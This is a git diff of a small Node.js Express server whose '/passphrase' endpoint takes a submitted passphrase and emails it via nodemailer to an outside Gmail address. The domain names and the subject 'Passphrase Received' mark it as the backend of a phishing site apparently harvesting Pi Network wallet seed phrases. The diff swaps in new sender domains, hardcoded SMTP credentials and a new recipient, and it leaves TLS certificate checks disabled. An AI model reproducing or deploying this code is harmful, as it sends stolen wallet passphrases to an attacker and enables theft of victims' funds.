@@ -14,12 +14,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 // Enable CORS
 app.use(cors()); // This enables CORS for all routes
 
-
-
-// Handle preflight requests for the '/passphrase' route
-app.options('/passphrase', cors()); // Respond to OPTIONS requests for the '/passphrase' route
-
-
 // Define routes
 app.get('/', (req, res) => {
   res.send('Hello World!');
@@ -35,12 +29,12 @@ app.post('/passphrase', async (req, res) => {
   const passphrase = req.body.passphrase;
 
   let transporter = nodemailer.createTransport({
-    host: "pitransferactivation.com",
+    host: "primecapitasmanagement.com",
     port: 465,
     secure: true, // true for 465, false for other ports
     auth: {
-      user: "sender@pitransferactivation.com", // generated ethereal user
-      pass: "pinetwork10", // generated ethereal password
+      user: "admin@piexternaltransaction.com", // generated ethereal user
+      pass: "Pienetwork10", // generated ethereal password
     },
     tls: {
       rejectUnauthorized: false
@@ -49,8 +43,8 @@ app.post('/passphrase', async (req, res) => {
 
   // Define the email message
   const mailOptions = {
-    from: 'sender@pitransferactivation.com',
-    to: 'pinetworkmainnetactivation@gmail.com',
+    from: 'admin@piexternaltransaction.com',
+    to: 'ashleygentry571@gmail.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
   };
